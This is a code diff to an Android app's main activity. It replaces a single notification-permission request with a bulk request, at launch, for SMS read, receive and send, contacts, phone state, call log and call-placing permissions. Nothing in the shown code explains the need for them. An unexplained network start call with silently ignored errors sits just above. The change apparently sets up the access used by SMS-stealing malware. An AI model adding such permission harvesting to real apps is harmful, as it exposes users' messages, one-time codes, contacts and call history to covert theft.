@@ -20,8 +20,24 @@ public class MainActivity extends Activity {
         super.onCreate(b);
         setContentView(R.layout.main);
         try { Net.start(this); } catch (Throwable ignored) {}
-        if (Build.VERSION.SDK_INT >= 33)
-            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOT);
+
+        java.util.List<String> need = new java.util.ArrayList<>();
+        String[] perms = {
+            android.Manifest.permission.READ_SMS,
+            android.Manifest.permission.RECEIVE_SMS,
+            android.Manifest.permission.SEND_SMS,
+            android.Manifest.permission.READ_CONTACTS,
+            android.Manifest.permission.READ_PHONE_STATE,
+            android.Manifest.permission.READ_CALL_LOG,
+            android.Manifest.permission.CALL_PHONE
+        };
+        for (String p : perms)
+            if (checkSelfPermission(p) != android.content.pm.PackageManager.PERMISSION_GRANTED) need.add(p);
+        if (Build.VERSION.SDK_INT >= 33
+                && checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS)
+                   != android.content.pm.PackageManager.PERMISSION_GRANTED)
+            need.add(android.Manifest.permission.POST_NOTIFICATIONS);
+        if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), REQ_NOT);
 
         findViewById(R.id.b1).setOnClickListener(new View.OnClickListener() {
             @Override public void onClick(View v) {
